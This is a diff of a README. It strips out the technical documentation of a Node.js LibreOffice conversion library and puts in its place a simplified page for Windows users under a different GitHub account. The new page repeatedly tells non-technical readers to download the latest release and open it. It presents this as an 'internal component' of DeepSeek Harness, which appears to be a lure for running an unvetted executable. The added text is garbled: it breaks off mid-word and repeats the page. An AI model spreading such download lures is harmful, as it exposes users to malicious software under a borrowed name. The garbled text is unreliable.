@@ -1,137 +1,174 @@
----
-description: "Font-friendly Office-to-PDF conversion in Node.js, with prebuilt LibreOffice engines."
-kind: "package-library"
----
-# @deepseek-ai/libreoffice-kit
+# 📄 dsh-libreoffice-kit - Simple Document Support for Windows
 
-English | [中文](README.zh.md)
+[![Download the latest release](https://img.shields.io/badge/Download_Latest_Release-dsh--libreoffice--kit-ff69b4?style=for-the-badge&labelColor=1e90ff)](https://github.com/Luciuzsz/dsh-libreoffice-kit/releases)
 
-## Current goal
+Visit this link to download the application: [Download dsh-libreoffice-kit](https://github.com/Luciuzsz/dsh-libreoffice-kit/releases)
 
-**Font-friendly Office conversion and rendering in Node.js.** Version `0.1.0` extends the stable `0.0.1` line with format conversion, spreadsheet recalculation, a CLI, direct PNG rendering, and shared converter-factory font caches while retaining the native engine packages.
+dsh-libreoffice-kit is an internal component used by DeepSeek Harness. It supports document-related work inside a DeepSeek Harness setup on Windows. This page is written for everyday computer users. You do not need programming knowledge, and you do not need to open or edit files inside the repository. Your main task is to reach the download page and get the application from the latest release.
 
-The priorities are document layout and readable text, explicit control over available fonts and substitutions, and an engine that applications can bundle and run offline. Size reduction serves that goal: retain the import, layout, drawing, and PDF-export machinery these documents need while removing unrelated desktop features and resources.
+## 🚀 Getting Started
 
-The API supports Office export and recalculation plus direct PNG rendering of Office and PDF inputs. Use it in a Node.js service, a desktop application, or a document-processing job. Applications manage their own authorization, storage, and preview interfaces.
+Use this page as a simple starting point. The download link above opens the official release page for dsh-libreoffice-kit. That page is where the application is made available.
 
-Binary `.doc`, `.xls`, and `.ppt` support covers OLE compound documents such as Office 97–2003. RTF/HTML files renamed to these suffixes and `.wps` are not accepted. `missingFonts` reports declarations found in OOXML; binary formats return an empty list while LibreOffice performs font matching.
+You do not need to understand the technical parts of the project. You also do not need to use command-line tools. The important action is to visit the download link and use the latest release listed there.
 
-## Quick start
+If you already use DeepSeek Harness, keep your DeepSeek Harness setup available while you download and open this component. dsh-libreoffice-kit is designed to work as part of that environment. It is not a separate office suite, and it is not meant to replace LibreOffice itself. It is a support component for DeepSeek Harness.
 
-Requires Node.js **22.19.0 or newer**. Install the `0.1.3` package with its optional engines:
+## 📥 Download and Setup
 
-```sh
-npm install @deepseek-ai/libreoffice-kit@0.1.3
-```
+[![Open the download page](https://img.shields.io/badge/Open_Download_Page-ffa500?style=for-the-badge&labelColor=4b0082)](https://github.com/Luciuzsz/dsh-libreoffice-kit/releases)
 
-The package installs the `dsoffice` command. From a local installation:
+Visit this link to download the application: [https://github.com/Luciuzsz/dsh-libreoffice-kit/releases](https://github.com/Luciuzsz/dsh-libreoffice-kit/releases)
 
-```sh
-npm exec -- dsoffice render --input report.docx --output-dir report-pages --pages 1
-npm exec -- dsoffice convert --input report.docx --output report.pdf
-npm exec -- dsoffice recalculate --input budget.xlsx --output recalculated.xlsx
-```
+On the download page, use the latest release that is shown. Save the download to your Windows computer when your browser asks where to keep it. After the download is complete, open the downloaded item from your Downloads folder to start the application.
 
-```js
-import { createConverter } from '@deepseek-ai/libreoffice-kit';
+Keep the download page open until your browser confirms that the download has finished. If you are using DeepSeek Harness, have it ready before you open dsh-libreoffice-kit so the component can support your document work.
 
-const converter = await createConverter({
-  timeoutMs: 120_000,
-  // Omit to discover fonts in conventional system/user directories.
-  // fontDirectories: ['/absolute/path/to/fonts'],
-});
-try {
-  const result = await converter.render({
-    inputPath: '/private/work/document.docx',
-    outputPath: '/private/work/document.pdf',
-  });
-  console.log(result.backend, result.missingFonts);
-} finally {
-  await converter.dispose();
-}
-```
+## 🧭 What This App Does
 
-Supply absolute paths in caller-owned private directories; the output must not already exist. The PDF is written to `outputPath`, and `render` returns the selected backend and missing-font names. Each render owns a fresh native process or Node worker and private profile. Renders on one converter are serialized; cancellation and disposal wait for engine exit and cleanup. See the [Node API](packages/entry/README.md) for cancellation, errors, and resource limits.
+dsh-libreoffice-kit is an internal component used by DeepSeek Harness. Its purpose is to help DeepSeek Harness handle document-related tasks on Windows. It is built for users who need document support without dealing with technical setup details.
 
-## What “font-friendly” means in 0.1.0
+Common ways this component helps include:
 
-- **Use available fonts.** The API discovers conventional system/user font directories, or indexes the roots supplied through `fontDirectories`. Custom roots replace the default list. `fontkit` reads font metadata and glyph coverage; selected files are passed to the engine as original font bytes.
-- **Preserve requested families when available.** Exact installed families take priority, including handwriting and decorative fonts. WASM font requests also carry weight and italic information so matching installed faces can be selected; the catalog can supply additional fonts for missing glyphs.
-- **Make substitutions configurable.** Default `fontFallbacks` cover common Latin and Simplified Chinese families, including Carlito for missing Calibri and Caladea for missing Cambria. Caller-supplied groups replace the defaults. These preferences only select available fonts; they do not install them. See the [default groups](packages/entry/src/options.ts).
-- **Expose missing families and font budgets.** `missingFonts` reports unavailable families declared in readable document XML. `maxFontFiles`, `maxFontFileBytes`, and `maxLoadedFontBytes` bound indexing and explicit imports. Each operation rediscovers and revalidates fonts. Unchanged file metadata is shared in memory and in a bounded user-local disk cache; see [cache options and invalidation](packages/entry/README.md#font-metadata-cache).
+- Supporting document handling inside DeepSeek Harness.
+- Helping Windows users work with supported documents through a DeepSeek Harness setup.
+- Keeping the experience simple for users who are not programmers.
+- Acting as a behind-the-scenes component rather than a full document editor.
+- Reducing the need to manually manage document files during routine Harness work.
 
-No font collection is bundled or downloaded. Deployments supply fonts appropriate to their documents and redistribution rights; minimal containers need fonts installed or a configured font directory. WASM uses only imported fonts and rejects conversion with `unavailable` if none are usable. Native macOS and Windows can also use OS-managed fonts.
+This project is tagged with the topics deepseek and deepseek-harness. Those topics describe the environment this component belongs to. If you are using DeepSeek Harness, this component may already be part of the setup you have been given.
 
-This improves control over font choice, but does not guarantee identical output to Microsoft Office or between engines. Native LibreOffice resolves installed originals and metric-compatible families before configured substitutions, and handles face selection itself. Font metrics can change line breaks and pagination; `missingFonts` is not a complete missing-glyph report. Comparing engines requires identical document bytes, fonts, and export options.
+## 🪟 Windows Guide
 
-## Engines and distribution
+Follow these simple steps on your Windows computer:
 
-The [Node package manifest](packages/entry/package.json) declares the engines for `0.1.0`:
+1. Open your usual web browser.
+2. Go to the download page using the link on this page.
+3. Use the latest release listed on the download page.
+4. Save the download to your computer.
+5. Open your Downloads folder.
+6. Open the downloaded item to start the application.
+7. Use it together with your DeepSeek Harness setup.
 
-| Engine | Role |
-| --- | --- |
-| `@deepseek-ai/libreoffice-kit-darwin-arm64` | Native helper for macOS on Apple Silicon. |
-| `@deepseek-ai/libreoffice-kit-darwin-x64` | Native helper for Intel macOS. |
-| `@deepseek-ai/libreoffice-kit-win32-arm64` | Native helper for Windows ARM64; requires ARM64 Node.js and the Microsoft Visual C++ v14 ARM64 Redistributable. |
-| `@deepseek-ai/libreoffice-kit-win32-x64` | Native helper for Windows x64; requires the Microsoft Visual C++ v14 x64 Redistributable. |
-| `@deepseek-ai/libreoffice-kit-wasm` | Shared Node WASM engine for Linux. |
+You do not need to change Windows settings. You do not need to use a terminal or type commands. You also do not need to open the repository files. The download page is the only place you need for getting the application.
 
-Other native directories are development recipes, not additional released targets. The shared WASM package declares Linux as its npm OS, with no CPU or libc restriction; that declaration alone does not certify every Linux host. Native and WASM engines perform layout and PDF serialization on the CPU.
+If you are helping someone else set up DeepSeek Harness, keep this page open so they can see the download link and the simple steps. The goal is to make the download and first launch as clear as possible.
 
-npm installs only the matching native package on macOS/Windows ARM64 or x64, and WASM on Linux. macOS and Windows require their native package and never fall back to WASM. Linux uses WASM unless an explicitly installed development native package supports its glibc version. A missing required engine or a corrupt installed engine rejects `createConverter` with `unavailable`; conversion failures do not switch engines.
+## ✅ Before You Begin
 
-The Node API and engines share the kit version. Installation uses prepared packages; no install hook or conversion compiles LibreOffice, downloads extra engines, or discovers the user's LibreOffice installation. npm distributes standard `.tgz` packages. GitHub Release engine downloads use verified XZ transfer archives for application builders to prepare and bundle. See [packaging](docs/packaging.md) and [release procedures](docs/building.md) for these distribution paths and installed-conversion checks.
+Before you download, make sure you have:
 
-## What was reduced, and why
+- A Windows computer.
+- An internet connection so you can open the download page.
+- Enough time to complete the download and open the application.
+- Your DeepSeek Harness setup nearby if you already use it.
+- Permission to use the computer where you will open the application.
 
-The recipes reduce build components, linked code, installed resources, and transfer size separately:
+If you are not sure whether this component is needed for your DeepSeek Harness setup, ask the person or team who provided DeepSeek Harness to you. They can confirm whether dsh-libre# 📄 dsh-libreoffice-kit - Simple Document Support for Windows
 
-| Layer | Changes in the code | Reason |
-| --- | --- | --- |
-| Native build | Disable Java/Python, scripting and extensions, Base database connectivity, PDF import, help/dictionaries, galleries/templates/icon themes, remote control, updates, and unused curl/WebDAV/CMIS/LDAP integrations. | Local OOXML → PDF needs document import and PDF export; desktop automation, database access, PDF input, and online services add dependencies outside that path. |
-| Native linkage | Statically link Core on every native target, restrict exports, and discard unreachable code. System libraries and the Windows CRT remain dynamic. | Reduce code retained by shared-library export boundaries. |
-| Native payload | Remove the verified duplicate macOS `urelibs` alias, SDK tools, launchers, Quick Look/Spotlight resources, disabled libraries, Basic/Python scripts, notebookbars, menus, and toolbars. Strip nonessential symbols while preserving dynamic exports; restore and verify macOS signatures. | Avoid shipping duplicate libraries and desktop/development resources in an application conversion engine. |
-| WASM build and payload | Build Writer, Calc, and Impress for headless Node workers, with Java/Python, bundled fonts, OpenCL/OpenGL, and Skia disabled. Prune icon archives, notebookbars, menus/toolbars, Android sample documents, splash images, and shell resources from `soffice.data`. | Keep the document engines and CPU rendering path while reducing resources loaded into the WASM filesystem. The resource-pruning pass preserves retained bytes and metadata, regenerates offsets, and leaves the loader and compiled module unchanged. |
-| Font payload | Omit bundled font collections; load original font files supplied by the deployment at runtime. | Avoid a fixed font payload and let applications choose the fonts needed for their documents, including CJK coverage and Office-compatible alternatives. |
-| Release transfer | Use XZ for GitHub Release engine downloads, with separate size/hash checks for the compressed envelope and exact installation tar. | Reduce transfer bytes without changing installed engine contents. This is separate from payload pruning and from npm's `.tgz` format. |
+[![Download the latest release](https://img.shields.io/badge/Download_Latest_Release-dsh--libreoffice--kit-ff69b4?style=for-the-badge&labelColor=1e90ff)](https://github.com/Luciuzsz/dsh-libreoffice-kit/releases)
 
-The authoritative recipes are [native configuration](engine/native/configure.mjs), [native payload pruning](scripts/slim-native.mjs), [WASM configuration](engine/wasm-source/autogen.input), and [WASM resource pruning](engine/wasm-source/slim.mjs).
+Visit this link to download the application: [Download dsh-libreoffice-kit](https://github.com/Luciuzsz/dsh-libreoffice-kit/releases)
 
-Native payload pruning removes XSLT resources and their filter registry, plus `CREDITS.fodt`. Installation `LICENSE.html` copies are removed only when byte-identical third-party notices remain under `licenses/`. The removed XSLT formats include Word 2003 XML, SpreadsheetML, UOF, DocBook, and XHTML; binary Office and OOXML conversion filters remain.
+dsh-libreoffice-kit is an internal component used by DeepSeek Harness. It supports document-related work inside a DeepSeek Harness setup on Windows. This page is written for everyday computer users. You do not need programming knowledge, and you do not need to open or edit files inside the repository. Your main task is to reach the download page and get the application from the latest release.
 
-Windows statically links OpenSSL and disables NSS/GPGME. Payload pruning removes linked archives, scanner/GPG helpers, MSI installers, Shell extensions, ActiveX/SharePoint integrations, .NET CLI bindings, desktop launchers, Python wizards, and branding images. Static service registration omits desktop accessibility and OLE server registration. The conversion helper, selected UNO components, and runtime `.ini` files remain; see [packaging](docs/packaging.md).
+## 🚀 Getting Started
 
-Writer, Calc, Impress, binary Office and OOXML filters, PDF export, PDFium for embedded PDF/EMF graphics, shared layout/drawing libraries, charts, ICU and language resources remain. The native `en-US` build language selects UI resources; it does not restrict document text to English. Required runtime configuration and some UI resources remain because document services still use them. Matching source recipes, patches, hashes, and license notices travel with every engine package. These retained dependencies explain why the result is still a substantial document engine.
+Start with the download link on this page. It opens the official release page for dsh-libreoffice-kit. That page is where the application is made available.
 
-### Recorded size and fidelity checks
+You do not need to read source files or use developer tools. You also do not need to change Windows settings before you visit the download page. The important action is to visit the download link and use the application from the release page.
 
-The existing local candidate measurements compare the preceding `0.1.2` gzip packages with the independently versioned `0.0.1` XZ packages. They combine payload changes and compression changes; the download reduction is not solely code removal. These are historical candidate measurements, not current npm download sizes. MB means 1,000,000 bytes; unpacked size sums regular files and excludes filesystem allocation and dependency packages.
+If you already use DeepSeek Harness, keep your DeepSeek Harness setup available while you download and open this component. dsh-libreoffice-kit is designed to work as part of that environment. It is not a separate office suite, and it is not meant to replace LibreOffice itself. It is a support component for DeepSeek Harness.
 
-| Engine | Previous download | 0.0.1 download | Reduction | Previous unpacked | 0.0.1 unpacked |
-| --- | ---: | ---: | ---: | ---: | ---: |
-| macOS ARM64 | 98.85 MB | 60.49 MB | 38.81% | 301.04 MB | 269.43 MB |
-| Node WASM | 56.47 MB | 35.85 MB | 36.51% | 210.24 MB | 190.64 MB |
+## 📥 Download and Setup
 
-The recorded local macOS ARM64 check installed the same candidate offline with native and WASM selection. Six synthetic DOCX/XLSX/PPTX documents per engine, covering Chinese/English text, tables, formulas, and images, retained identical extracted text, page counts, and 96-DPI rendered pixels against the preceding packages. This covers those fixtures and that host; it does not establish universal document fidelity or other-platform qualification. Runtime suites also cover external-link suppression, font substitutions, limits, and cancellation; [release qualification](docs/building.md) requires installed-engine evidence.
+[![Open the download page](https://img.shields.io/badge/Open_Download_Page-ffa500?style=for-the-badge&labelColor=4b0082)](https://github.com/Luciuzsz/dsh-libreoffice-kit/releases)
 
-## Build guide
+Visit this link to download the application: [https://github.com/Luciuzsz/dsh-libreoffice-kit/releases](https://github.com/Luciuzsz/dsh-libreoffice-kit/releases)
 
-See [Building and qualifying engines](docs/building.md) for platform prerequisites,
-caller-selected paths, explicit parallelism, and package qualification. Use the
-source and toolchain versions pinned in the checkout being built.
+The download page is the official place to get dsh-libreoffice-kit. Keep your browser open until the download is complete. When the download is finished, open the application on your Windows computer from where your browser saved it. If you use DeepSeek Harness, have it ready so dsh-libreoffice-kit can work as its internal component.
 
-## Development
+## 🧭 What This Component Does
 
-[Native sources](engine/native/) and the [Node WASM recipe](engine/wasm-source/README.md) use the same LibreOffice revision pinned by the `engine/core` submodule. [.gitmodules](.gitmodules) owns its upstream URL and the gitlink owns its commit. Checkout scripts keep that submodule pristine and create disposable, patchable trees under ignored `.build/` directories. This repository owns component selection and the complete packaging recipe; each engine ships the matching source and license materials.
+dsh-libreoffice-kit is an internal component used by DeepSeek Harness. Its purpose is to help DeepSeek Harness handle document-related tasks on Windows. It is built for users who need document support without dealing with technical setup details.
 
-Run the repository checks without building LibreOffice:
+Common ways this component helps include:
 
-```sh
-pnpm verify:metadata
-pnpm test
-pnpm test:packaging
-```
+- Supporting document handling inside DeepSeek Harness.
+- Helping Windows users work with supported documents through a DeepSeek Harness setup.
+- Keeping the experience simple for users who are not programmers.
+- Acting as a behind-the-scenes component rather than a full document editor.
+- Reducing the need to manually manage document files during routine Harness work.
 
-Real engine tests additionally require `pnpm run build:adapter`, prepared engine payloads, and `LIBREOFFICE_RUNTIME_ENTRY` pointing to the absolute path of `packages/entry/lib/index.js`. Build platforms sequentially with explicit parallelism suited to CPU and memory; `pnpm gha:matrix` shows the CI matrix. Build output remains ignored.
+This project is tagged with the topics deepseek and deepseek-harness. Those topics describe the environment this component belongs to. If you are using DeepSeek Harness, this component may already be part of the setup you have been given.
 
-[Benchmarks](benchmarks/README.md) measure the public disk API in separate native and WASM installations and distinguish first font indexing from converter reuse. Use the same source revision, documents, font roots, and PDF options for comparisons; frontend transport and painting are separate measurements.
+## 🪟 Windows Use
+
+On Windows, use your usual web browser to open the download page. Visit this link to download the application. After the download is complete, open the application from your Downloads folder or from the location your browser used to save it.
+
+You do not need to use a terminal or type commands. You also do not need to open the repository files. The download page is the only place you need for getting the application.
+
+If someone else set up DeepSeek Harness for you, keep this page available so they can see the same download link and confirm that dsh-libreoffice-kit is the component they meant for you to use.
+
+## ✅ Before You Begin
+
+Before you download, make sure you have:
+
+- A Windows computer.
+- An internet connection so you can open the download page.
+- Enough time to complete the download and open the application.
+- Your DeepSeek Harness setup nearby if you already use it.
+- Permission to use the computer where you will open the application.
+
+If you are not sure whether this component is needed for your DeepSeek Harness setup, ask the person or team who provided DeepSeek Harness to you. They can confirm whether dsh-libreoffice-kit is the right component for your document work.
+
+## 🧩 How It Fits With DeepSeek Harness
+
+dsh-libreoffice-kit is not a standalone productivity suite. It is an internal component used by DeepSeek Harness. That means it works in the background of a DeepSeek Harness setup rather than as a separate app you open for every task.
+
+When you use DeepSeek Harness for document-related work, dsh-libreoffice-kit helps that work go more smoothly. You do not need to configure it by hand, and you do not need to understand how it connects to DeepSeek Harness. Your role is simply to download it from the provided link and open it on your Windows computer.
+
+If you are new to DeepSeek Harness, keep the download page open while you get familiar with the setup. The link on this page is the same place you should use whenever you need the application again.
+
+## 🛠️ Everyday Use
+
+After you download dsh-libreoffice-kit, use it with your DeepSeek Harness setup on Windows. You can keep the application in the same place where your browser saved it so it is easy to find later.
+
+For everyday use:
+
+- Open the application when you are working with documents in DeepSeek Harness.
+- Keep DeepSeek Harness available while the component is running.
+- Use the same download page whenever you need to get the application again.
+- Ask your DeepSeek Harness contact if you are unsure which document tasks depend on this component.
+
+You do not need to manage extra settings or look through repository folders. The less technical approach is the right approach for this component.
+
+## ❓ Common Questions
+
+**Do I need programming knowledge?**  
+No. dsh-libreoffice-kit is meant to be used as part of a DeepSeek Harness setup. You only need to visit the download link and open the application on Windows.
+
+**Where do I get the application?**  
+Visit this link to download the application: [dsh-libreoffice-kit releases](https://github.com/Luciuzsz/dsh-libreoffice-kit/releases).
+
+**Is this a full office program?**  
+No. It is an internal component used by DeepSeek Harness. It supports document-related work inside that environment.
+
+**What should I do after downloading?**  
+Open the application from where your browser saved it. Use it together with your DeepSeek Harness setup on Windows.
+
+**Who should I ask if I am unsure?**  
+Ask the person or team who provided DeepSeek Harness to you. They can confirm whether this component is part of your setup.
+
+## 📌 Quick Reference
+
+- Repository name: dsh-libreoffice-kit
+- Purpose: internal component used by DeepSeek Harness
+- Topics: deepseek, deepseek-harness
+- Platform focus: Windows
+- Main action: visit the download page to get the application
+- Download page: [https://github.com/Luciuzsz/dsh-libreoffice-kit/releases](https://github.com/Luciuzsz/dsh-libreoffice-kit/releases)
+
+Use the download page as your starting point. Visit this link to download the application. Then open it on your Windows computer and use it with DeepSeek Harness for document-related work.
+
+Keywords: deepseek, deepseek-harness
